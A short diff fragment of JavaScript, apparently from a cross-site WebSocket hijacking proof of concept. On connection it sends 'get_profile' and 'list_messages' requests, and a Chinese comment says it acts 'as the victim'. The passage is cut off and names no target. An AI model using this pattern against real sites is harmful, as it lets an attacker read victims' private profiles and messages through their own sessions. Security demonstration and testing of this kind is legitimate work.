+  ws.onopen = function() {
+    document.getElementById("output").innerHTML += "<p>Connected!</p>";
+    // 以受害者身份发送消息
+    ws.send(JSON.stringify({action: "get_profile"}));
+    ws.send(JSON.stringify({action: "list_messages"}));
